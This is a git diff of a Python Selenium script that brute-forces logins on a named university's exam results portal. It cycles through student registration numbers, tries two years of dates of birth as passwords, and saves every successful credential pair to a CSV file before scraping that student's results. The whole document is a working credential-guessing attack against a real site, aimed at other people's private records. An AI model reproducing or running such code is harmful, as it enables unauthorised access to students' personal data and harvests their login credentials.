@@ -10,7 +10,7 @@ driver = webdriver.Firefox(options=options)
 
 f = open('collected.csv', 'w')
 sleeptime = 1
-daycount = 365	
+daycount = 365*2
 
 def collect():
 	## now you are inside resutls
@@ -68,7 +68,7 @@ def login(regno, dob):
 
 driver.get("http://cloudportal.sathyabama.ac.in/sist_results_may_2020/login.php")
 
-for reg in range(39111039,39111040):
+for reg in range(39111038,39111043):
 	regno = str(reg)
 
 	flag = 0
@@ -77,21 +77,20 @@ for reg in range(39111039,39111040):
 		dob = single_date.strftime("%d/%m/%Y")
 		print('trying {} for {}'.format(dob,regno))
 		if login(regno,dob)==1:
-			sleep(1)
-			try:
-				driver.find_element_by_id("btnLogout")
-			except:
-				continue		
+			f.write('{}\t{}'.format(regno, dob))
+			flag=1
+			break
 		else:
 			continue
 
 	if (flag == 0):
 		continue
 
-	print('reg {} done at {}'.format(regno, dob))
+	print('reg {} done at {}\n'.format(regno, dob))
 
 	try:
 		collect()
+		sleep(1)
 		driver.find_element_by_id("btnLogout").click()
 	except:
 		print('*****-> fail in collect')
